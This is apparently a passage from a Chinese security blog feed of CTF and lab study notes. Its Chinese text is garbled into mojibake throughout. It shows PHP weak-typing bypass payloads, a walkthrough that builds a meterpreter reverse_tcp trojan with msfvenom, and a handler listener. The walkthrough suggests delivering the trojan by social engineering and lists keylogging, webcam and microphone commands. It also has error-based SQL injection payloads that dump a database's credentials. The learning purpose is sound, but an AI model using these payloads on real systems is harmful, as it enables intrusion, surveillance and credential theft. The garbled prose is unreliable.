href="#1-æ¯”è¾ƒç¬¦å·" class="headerlink" title="1.æ¯”è¾ƒç¬¦å·"></a>1.æ¯”è¾ƒç¬¦å·</h4><p>==            å…ˆè¿›è¡Œç±»å‹è½¬åŒ–ï¼Œå†è¿›è¡Œæ¯”è¾ƒï¼ˆå¼±æ¯”è¾ƒï¼‰</p><p>===          å…ˆæ¯”è¾ƒç±»å‹ï¼Œè‹¥ç±»å‹ä¸åŒç›´æ¥è¿”å›ä¸ç­‰ï¼ˆå¼ºæ¯”è¾ƒï¼‰</p><p>Tips</p><p>Boolç±»å‹çš„trueå’Œä»»æ„å­—ç¬¦ä¸²çš„å¼±ç±»å‹ç›¸ç­‰</p><p>æ•°å­—ä¸å­—ç¬¦ä¸²ç›¸æ¯”è¾ƒï¼Œä¼šå°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å­—</p><p>è‹¥å­—ç¬¦ä¸²ä»¥æ•°å­—å¼€å¤´ï¼Œåˆ™å–å¼€å¤´æ•°å­—ä½œä¸ºè½¬åŒ–ç»“æœï¼Œ</p><p>è‹¥æ— åˆ™è½¬åŒ–ä¸º0ï¼Œè‹¥ç¬¦åˆç§‘å­¦è®°æ•°æ³•çš„å½¢å¼ï¼Œåˆ™æŒ‰ç…§ç§‘å­¦è®°æ•°æ³•æ¥å–</p><h4 id="2-hashæ¯”è¾ƒç¼ºé™·"><a href="#2-hashæ¯”è¾ƒç¼ºé™·" class="headerlink" title="2.hashæ¯”è¾ƒç¼ºé™·"></a>2.hashæ¯”è¾ƒç¼ºé™·</h4><p>å¦‚æœé‡‡ç”¨</p><p>== è¿ç®—ç¬¦æ¯”è¾ƒå“ˆå¸Œå€¼ï¼Œä¼šé¢ä¸´ä¸Šé¢è®²çš„å¼±ç±»å‹æ¯”è¾ƒçš„é—®é¢˜ï¼Œ</p><p>å³ä»»ä½•ä»¥â€™0eâ€™ å¼€å¤´çš„å­—ç¬¦ä¸²éƒ½ç›¸ç­‰ï¼</p><p>å¸¸è§çš„md5</p><p>è¿ç®—åä»¥â€™0eâ€™å¼€å¤´çš„å­—ç¬¦ä¸²æœ‰ï¼š</p><p>QNKCDZO</p><p>s878926199a</p><p>s155964671a</p><p>s1885207154a</p><p>s1836677006a</p><p>s1184209335a</p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901104340610.png" alt="image-20210901104340610"></p><h4 id="3-md5-sha1å‡½æ•°ç¼ºé™·"><a href="#3-md5-sha1å‡½æ•°ç¼ºé™·" class="headerlink" title="3.md5 sha1å‡½æ•°ç¼ºé™·"></a>3.md5 sha1å‡½æ•°ç¼ºé™·</h4><p>å½“md5()å‡½æ•°ä¸sha1()å‡½æ•°å¯¹å‚æ•°è¿›è¡ŒåŠ å¯†å¤„ç†æ—¶ï¼Œ</p><p>å¦‚æœç¢°åˆ°ä¸€ä¸ªæ•°ç»„ï¼Œmd5()å‡½æ•°ä¼šè¿”å›null</p><p>sha1()å‡½æ•°ä¹Ÿæ˜¯ä¸€æ ·ã€‚</p><p>åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ„é€ ä¸¤ä¸ªæ•°ç»„å³å¯ã€‚</p><p>a[]=1å³è¡¨ç¤ºä¼ å…¥äº†ä¸€ä¸ªæ•°ç»„</p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901104608235.png" alt="image-20210901104608235"></p><p>å˜é‡è¦†ç›–</p><h4 id="1-parse-strå¯¼è‡´çš„å˜é‡è¦†ç›–"><a href="#1-parse-strå¯¼è‡´çš„å˜é‡è¦†ç›–" class="headerlink" title="1.parse_strå¯¼è‡´çš„å˜é‡è¦†ç›–"></a>1.parse_strå¯¼è‡´çš„å˜é‡è¦†ç›–</h4><p>parse_str( string $encoded_string[.array &amp;$result] )</p><p>parse_str() å‡½æ•°ç”¨äºæŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ï¼Œ</p><p>å¦‚æœæ²¡æœ‰resultå‚æ•°ï¼Œåˆ™ç”±è¯¥å‡½æ•°è®¾ç½®çš„å˜é‡å°†è¦†ç›–å·²å­˜åœ¨çš„åŒåå˜é‡ï¼Œ</p><p>å¦‚æœè®¾ç½®äº†ç¬¬äºŒä¸ªå˜é‡result</p><p>å˜é‡å°†ä¼šä»¥æ•°ç»„å…ƒç´ çš„å½¢å¼å­˜å…¥åˆ°è¿™ä¸ªæ•°ç»„ï¼Œä½œä¸ºæ›¿ä»£ã€‚</p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901145407518.png" alt="image-20210901145407518"></p><h4 id="2-X-Forwarded-Forç»•è¿‡æŒ‡å®šåœ°å€"><a href="#2-X-Forwarded-Forç»•è¿‡æŒ‡å®šåœ°å€" class="headerlink" title="2.X-Forwarded-Forç»•è¿‡æŒ‡å®šåœ°å€"></a>2.X-Forwarded-Forç»•è¿‡æŒ‡å®šåœ°å€</h4><p>HTTPå¤´æ·»åŠ X-Forwarded-Forï¼š</p><h4 id="3-stropsæ•°ç»„ç»•è¿‡NULLä¸eregæ­£åˆ™-00æˆªæ–­"><a href="#3-stropsæ•°ç»„ç»•è¿‡NULLä¸eregæ­£åˆ™-00æˆªæ–­" class="headerlink" title="3.stropsæ•°ç»„ç»•è¿‡NULLä¸eregæ­£åˆ™%00æˆªæ–­"></a>3.stropsæ•°ç»„ç»•è¿‡NULLä¸eregæ­£åˆ™%00æˆªæ–­</h4><p>çŸ¥è¯†ç‚¹è¡¥å……ï¼š</p><p>PHP strops()å‡½æ•°</p><p>å®šä¹‰å’Œç”¨æ³•ï¼š</p><p>strops()å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</p><p>æ³¨é‡Šï¼šstrops()å‡½æ•°å¯¹å¤§å°å†™æ•æ„Ÿ</p><p>â€‹            è¯¥å‡½æ•°æ˜¯äºŒè¿›åˆ¶å®‰å…¨çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strpos(<span class="keyword">string</span>,find,start)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>find</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>start</em></td><td align="left">å¯é€‰ã€‚è§„å®šåœ¨ä½•å¤„å¼€å§‹æœç´¢ã€‚</td></tr></tbody></table><table><thead><tr><th>è¿”å›å€¼ï¼š</th><th>è¿”å›å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å› FALSEã€‚<strong>æ³¨é‡Šï¼š</strong>å­—ç¬¦ä¸²ä½ç½®ä» 0 å¼€å§‹ï¼Œä¸æ˜¯ä» 1 å¼€å§‹ã€‚</th></tr></thead><tbody><tr><td>PHP ç‰ˆæœ¬ï¼š</td><td>4+</td></tr></tbody></table><p>eregæ­£åˆ™å‡½æ•°</p><p>å­—ç¬¦ä¸²æ¯”å¯¹è§£æ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ereg(<span class="keyword">string</span> pattern, <span class="keyword">string</span> <span class="keyword">string</span>, <span class="keyword">array</span> [regs]);</span><br></pre></td></tr></table></figure><p>æœ¬å‡½æ•°ä»¥ pattern çš„è§„åˆ™æ¥è§£ææ¯”å¯¹å­—ç¬¦ä¸² stringã€‚</p><p>æ¯”å¯¹ç»“æœè¿”å›çš„å€¼æ”¾åœ¨æ•°ç»„å‚æ•° regs ä¹‹ä¸­ï¼Œregs[0] å†…å®¹å°±æ˜¯åŸå­—ç¬¦ä¸² stringã€regs[1] ä¸ºç¬¬ä¸€ä¸ªåˆä¹è§„åˆ™çš„å­—ç¬¦ä¸²ã€regs[2] å°±æ˜¯ç¬¬äºŒä¸ªåˆä¹è§„åˆ™çš„å­—ç¬¦ä¸²ï¼Œä½™ç±»æ¨ã€‚è‹¥çœç•¥å‚æ•° regsï¼Œåˆ™åªæ˜¯å•çº¯åœ°æ¯”å¯¹ï¼Œæ‰¾åˆ°åˆ™è¿”å›å€¼ä¸º trueã€‚</p><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901150729125.png" alt="image-20210901150729125"></p><p>æ–¹æ³•ä¸€ï¼š</p><p>æ—¢è¦æ˜¯çº¯æ•°å­—</p><p>åˆè¦æœ‰â€™ #biubiubiuâ€™</p><p>strpos()æ‰¾çš„æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆä¼ ä¸€ä¸ªæ•°ç»„ç»™å®ƒ</p><p>strpos()å‡ºé”™è¿”å›null,null!==false,</p><p>æ‰€ä»¥ç¬¦åˆè¦æ±‚</p><p>æ‰€ä»¥è¾“å…¥nctf[]= </p><p>é‚£ä¸ºä»€ä¹ˆereg()ä¹Ÿèƒ½ç¬¦åˆå‘¢?</p><p>å› ä¸ºereg()</p><p>åœ¨å‡ºé”™æ—¶è¿”å›çš„ä¹Ÿæ˜¯null,null!==false,</p><p>æ‰€ä»¥ç¬¦åˆè¦æ±‚</p><p>æ–¹æ³•äºŒï¼š</p><p>å­—ç¬¦ä¸²æˆªæ–­</p><p>åˆ©ç”¨ereg()çš„NULLæˆªæ–­æ¼æ´ï¼Œç»•è¿‡æ­£åˆ™è¿‡æ»¤</p><p>?nctf=1%00%23biubiubiu </p><h3 id="æ¨¡æ‹Ÿæ¼”ç»ƒï¼š"><a href="#æ¨¡æ‹Ÿæ¼”ç»ƒï¼š" class="headerlink" title="æ¨¡æ‹Ÿæ¼”ç»ƒï¼š"></a>æ¨¡æ‹Ÿæ¼”ç»ƒï¼š</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/capture_20210831213941122.bmp" alt="capture_20210831213941122"></p><p>?password=1337a</p><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/capture_20210831214131149.bmp" alt="capture_20210831214131149"></p><p>?name[]=1&amp;passsword[]=2</p><p>è§£æï¼šsha1()å‡½æ•°é»˜è®¤çš„ä¼ å…¥å‚æ•°ç±»å‹æ˜¯å­—ç¬¦ä¸²ï¼Œå½“ä¼ å…¥æ•°ç»„æ—¶å‡ä¼šè¿”å›falseï¼Œé€šè¿‡åˆ¤æ–­ã€‚</p><h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><p><img src="/2021/08/31/php/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/image-20210901105909901.png" alt="image-20210901105909901"></p><p>?a=240610708æˆ–?a=s878926199a</p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€æ¬¡ç®€å•çš„kaliæ¸—é€æµ‹è¯•</title>
      <link href="/2021/08/30/src/0830/"/>
      <url>/2021/08/30/src/0830/</url>
      
        <content type="html"><![CDATA[<h4 id="8-30"><a href="#8-30" class="headerlink" title="8.30"></a>8.30</h4><p> å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://blog.csdn.net/k_love1219/article/details/104591110">è®°ä¸€æ¬¡Kaliç³»ç»Ÿæ¸—é€é¶æœº(ç‰©ç†æœº)çš„è¯¦ç»†è¿‡ç¨‹ï¼ˆæ¸—é€å¿…å¤‡ï¼‰_k_love1219çš„åšå®¢-CSDNåšå®¢</a></p><p>é¦–å…ˆå¼€å¯kali-2018</p><p><img src="/2021/08/30/src/0830/image-20210830165837896.png" alt="image-20210830165837896"></p><p>æ¥ç€æˆ‘ä»¬å¼€å§‹åˆ›å»ºæœ¨é©¬æ–‡ä»¶</p><p>è¾“å…¥ä»¥ä¸‹æŒ‡ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;ä½ çš„è™šæ‹Ÿæœºipåœ°å€ lport&#x3D;4444 -f exe -o &#x2F;root&#x2F;Desktop&#x2F;aaa.exe</span><br></pre></td></tr></table></figure><p>æ¡Œé¢ä¼šç”Ÿæˆåä¸ºaaa.exeçš„æœ¨é©¬æ–‡ä»¶</p><p><img src="/2021/08/30/src/0830/image-20210830170039670.png" alt="image-20210830170039670"></p><p>æˆ‘ä»¬è¿›å…¥msfconsole</p><p><img src="/2021/08/30/src/0830/image-20210830170155242.png" alt="image-20210830170155242"></p><p>ä½¿ç”¨å¦‚ä¸‹ä¸€ç³»åˆ—æŒ‡ä»¤ï¼š</p><p>ä½¿ç”¨exploit/multi/handler</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br></pre></td></tr></table></figure><p>è®¾ç½®payload </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure><p>è®¾ç½®æœ¨é©¬ç›‘å¬å›ä¼ ipåœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lhost ä½ çš„è™šæ‹Ÿæœºçš„ipåœ°å€</span><br></pre></td></tr></table></figure><p>è®¾ç½®æœ¨é©¬ç›‘å¬å›ä¼ ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lport 4444</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/src/0830/image-20210830170532133.png" alt="image-20210830170532133"></p><p>è¿˜å¯ä»¥ç”¨ show optionsæ¥ç¡®è®¤æ˜¯å¦è®¾ç½®æˆåŠŸ</p><p>è¿™æ—¶å€™æˆ‘ä»¬åˆ©ç”¨ç¤¾ä¼šå·¥ç¨‹å­¦çš„çŸ¥è¯†æ¥å°†æœ¨é©¬ç—…æ¯’é€è¿›é¶æœº</p><p>dogeï¼ˆå¯ä»¥è®¾ç½®æ”¾åœ¨ç‰©ç†æœºæ¡Œé¢ä¸Šï¼Œç„¶åç‚¹å‡»è¿è¡Œå³å¯ï¼Œè‹¥ä¸æ”¾å¿ƒå¯è‡ªè¡Œå‰å»ä»»åŠ¡ç®¡ç†å™¨çš„è¯¦ç»†ä¿¡æ¯æŸ¥çœ‹æ˜¯å¦æœ‰è¿›ç¨‹aaa.exeï¼‰</p><p><img src="/2021/08/30/src/0830/image-20210831085318058.png" alt="image-20210831085318058"></p><p>å¯ä»¥çœ‹åˆ°å»ºç«‹äº†session</p><p>è¯´æ˜æˆ‘ä»¬å·²ç»æˆåŠŸè¿ä¸Šäº†é¶æœº</p><p>è¯•ç€è¿è¡Œä¸€äº›æŒ‡ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/src/0830/image-20210831085740617.png" alt="image-20210831085740617"></p><p>æŸ¥çœ‹äº†é¶æœºçš„ä¸€äº›ä¿¡æ¯</p><p>æ­¤å¤–è¿˜æœ‰çš„å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">getuid    è·å–ç³»ç»ŸIDä»¥åŠè®¡ç®—æœºåç§°</span><br><span class="line">kill    ä¸­æ­¢è¿›ç¨‹</span><br><span class="line">ps    åˆ—ä¸¾æ­£åœ¨è¿è¡Œä¸­çš„è¿›ç¨‹</span><br><span class="line">getpid    è·å–å½“å‰è¿›ç¨‹æ ‡è¯†ç¬¦</span><br><span class="line">keyscan_start     å¼€å¯æŒ‰é”®è®°å½•ä¼šè¯</span><br><span class="line">keyscan_stop     ç»ˆæ­¢æŒ‰é”®è®°å½•ä¼šè¯</span><br><span class="line">keyscan_dump   è½¬å‚¨ä»è¢«æ”»å‡»ä¸»æœºæ•è·åˆ°çš„æŒ‰é”®</span><br><span class="line">enumdesktops    åˆ—ä¸¾æ‰€æœ‰å¯è®¿é—®åˆ°çš„æ¡Œé¢å’Œå·¥ä½œç«™</span><br><span class="line">getdesktop    è·å–å½“å‰meterpreteræ¡Œé¢</span><br><span class="line">setdesktop    å˜æ›´meterpreterå½“å‰æ¡Œé¢</span><br><span class="line">webcam_list   åˆ—ä¸¾ç³»ç»Ÿä¸­æ‰€æœ‰çš„æ‘„åƒå¤´</span><br><span class="line">webcam_snap   æ•è·è¢«æ”»å‡»ä¸»æœºçš„å¿«ç…§</span><br><span class="line">record_mic    ä»ä¸»æœºçš„é»˜è®¤éº¦å…‹é£ä¸­è®°å½•ç¯å¢ƒå£°éŸ³</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°æ›´ä¸ºé«˜çº§çš„å…æ€æœ¨é©¬æ–‡ç« ï¼š</p><p><a href="https://www.cnblogs.com/leeqizhi/p/13029755.html">MSFåˆ¶ä½œå…æ€æœ¨é©¬ - è¿·é€”å°æ›¸ç«¥~ - åšå®¢å›­ (cnblogs.com)</a></p><h4 id="8-31"><a href="#8-31" class="headerlink" title="8.31"></a>8.31</h4><p>ä»Šå¤©æ‰¾åˆ°å¦å¤–ä¸€ç¯‡æ–‡ç« æ¥è·å–shell</p><p>æ“ä½œæ–¹æ³•å·®ä¸å¤š</p><p><a href="https://blog.csdn.net/cxcsdn666/article/details/100813443">Kaliåˆ©ç”¨MSFæ¸—é€Win 7è·å–shell_èˆæŒ‡å¦‚æ­Œ~çš„åšå®¢-CSDNåšå®¢</a></p><p>è¿™æ¬¡ä¸æ‡‚ä¸ºä»€ä¹ˆæ–‡ä»¶å¤åˆ¶ä¸åˆ°win7ä¸Šï¼Œç´¢æ€§å°±ç”¨äº†ç‰©ç†æœºæ¥è¯•éªŒ</p><p><a href="https://blog.csdn.net/u012206617/article/details/97389338">è·å–Shellï¼ˆææƒï¼‰åçš„æ“ä½œï¼ˆwindowsã€Linuxï¼‰_å¢¨ç—•è¯‰æ¸…é£çš„åšå®¢-CSDNåšå®¢_shellææƒ</a></p><p>è¿™æ—¶å€™ä¹‹å‰çš„ä¸€ç¯‡å®‰å…¨å®¢æ–‡ç« å°±è®²çš„ååˆ†è¯¦ç»†äº†</p><p><a href="https://www.anquanke.com/post/id/235631">MSFä½¿ç”¨è¯¦è§£ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> src </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜ 2019 HardSQL</title>
      <link href="/2021/08/30/buu/16/"/>
      <url>/2021/08/30/buu/16/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00çŸ¥è¯†ç‚¹ï¼š"><a href="#0x00çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="0x00çŸ¥è¯†ç‚¹ï¼š"></a>0x00çŸ¥è¯†ç‚¹ï¼š</h4><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p>sqlæ³¨å…¥ä¸­çš„updatexml()å‡½æ•°</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML(XML_document, XPath_string, new_value);</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc</p><p>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚</p><p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</p><p>ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</p><p>æ”¹å˜XML_documentä¸­ç¬¦åˆXPATH_stringçš„å€¼</p><p>ä¾‹å­ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(<span class="keyword">SELECT</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>â€‹            å…¶ä¸­çš„concat()å‡½æ•°æ˜¯å°†å…¶è¿æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå› æ­¤ä¸ä¼šç¬¦åˆXPATH_stringçš„æ ¼å¼ï¼Œä»è€Œå‡ºç°æ ¼å¼é”™è¯¯ï¼Œçˆ†å‡º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;:root@localhost&#39;</span><br></pre></td></tr></table></figure><p>xpathè¯­æ³•æ€»ç»“ï¼š<a href="https://www.jb51.net/article/125607.htm">https://www.jb51.net/article/125607.htm</a></p><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExtractValue(xml_frag, xpath_expr)</span><br></pre></td></tr></table></figure><p>ExtractValue()æ¥å—ä¸¤ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œä¸€ä¸ªXMLæ ‡è®°ç‰‡æ®µ xml_fragå’Œä¸€ä¸ªXPathè¡¨è¾¾å¼ xpath_exprï¼ˆä¹Ÿç§°ä¸º å®šä½å™¨ï¼‰; å®ƒè¿”å›CDATAç¬¬ä¸€ä¸ªæ–‡æœ¬èŠ‚ç‚¹çš„textï¼ˆï¼‰ï¼Œè¯¥èŠ‚ç‚¹æ˜¯XPathè¡¨è¾¾å¼åŒ¹é…çš„å…ƒç´ çš„å­å…ƒç´ ã€‚</p><p>ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥ä¼ å…¥ç›®æ ‡xmlæ–‡æ¡£</p><p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯ç”¨Xpathè·¯å¾„æ³•è¡¨ç¤ºçš„æŸ¥æ‰¾è·¯å¾„</p><p>ä¾‹å­ï¼š</p><p>ä¾‹å¦‚ï¼šSELECT ExtractValue(â€˜<a><b><b></b></b></a>â€˜, â€˜/a/bâ€™); å°±æ˜¯å¯»æ‰¾å‰ä¸€æ®µxmlæ–‡æ¡£å†…å®¹ä¸­çš„aèŠ‚ç‚¹ä¸‹çš„bèŠ‚ç‚¹ï¼Œè¿™é‡Œå¦‚æœXpathæ ¼å¼è¯­æ³•ä¹¦å†™é”™è¯¯çš„è¯ï¼Œå°±ä¼šæŠ¥é”™ã€‚è¿™é‡Œå°±æ˜¯åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ¥è·å¾—æˆ‘ä»¬æƒ³è¦çŸ¥é“çš„å†…å®¹ã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/4267332-e7ea259697eb4cf6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/421/format/webp" alt="img"></p><p>åˆ©ç”¨concatå‡½æ•°å°†æƒ³è¦è·å¾—çš„æ•°æ®åº“å†…å®¹æ‹¼æ¥åˆ°ç¬¬äºŒä¸ªå‚æ•°ä¸­ï¼ŒæŠ¥é”™æ—¶ä½œä¸ºå†…å®¹è¾“å‡ºã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/4267332-f13351339e441a96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/580/format/webp" alt="img"></p><h4 id="0x00è§£é¢˜"><a href="#0x00è§£é¢˜" class="headerlink" title="0x00è§£é¢˜"></a>0x00è§£é¢˜</h4><p><img src="/2021/08/30/buu/16/image-20210830091906610.png" alt="image-20210830091906610"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></pre></td></tr></table></figure><p>çˆ†å‡ºåº“</p><p><img src="/2021/08/30/buu/16/image-20210830092011080.png" alt="image-20210830092011080"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/image-20210830092201589.png" alt="image-20210830092201589"></p><p>çˆ†å‡ºè¡¨å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/image-20210830092501514.png" alt="image-20210830092501514"></p><p>çˆ†å‡ºåˆ—å</p><p>æ„é€ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/image-20210830092549838.png" alt="image-20210830092549838"></p><p>å³è¾¹çš„flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure><p><img src="/2021/08/30/buu/16/Users/David/AppData/Roaming/Typora/typora-user-images/image-20210830092639064.png" alt="image-20210830092639064"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¡¥å……ï¼š</span><br><span class="line"></span><br><span class="line">1ï¼šç©ºæ ¼è¢«è¿‡æ»¤å¯ä»¥ä½¿ç”¨&#x2F;**&#x2F;æˆ–è€…()ç»•è¿‡</span><br><span class="line">2ï¼š&#x3D;å·è¢«è¿‡æ»¤å¯ä»¥ç”¨likeæ¥ç»•è¿‡</span><br><span class="line">3ï¼šsubstringä¸midè¢«è¿‡æ»¤å¯ä»¥ç”¨rightä¸leftæ¥ç»•è¿‡</span><br></pre></td></tr></table></figure><h4 id="å‚è€ƒåšå®¢ï¼š"><a href="#å‚è€ƒåšå®¢ï¼š" class="headerlink" title="å‚è€ƒåšå®¢ï¼š"></a>å‚è€ƒåšå®¢ï¼š</h4><p>[<a href="https://blog.csdn.net/qq_51652864/article/details/115740086">æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL_o3Evçš„åšå®¢-CSDNåšå®¢</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF 2018 WarmUp</title>
      <link href="/2021/08/29/buu/15/"/>
      <url>/2021/08/29/buu/15/</url>
      
        <content type="html"><![CDATA[<p> é‡æ–°å›é¡¾äº†ä¸‹è¿™é¢˜</p><p><img src="/2021/08/29/buu/15/image-20210829094805908.png" alt="image-20210829094805908"></p><p>F12æŸ¥çœ‹åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 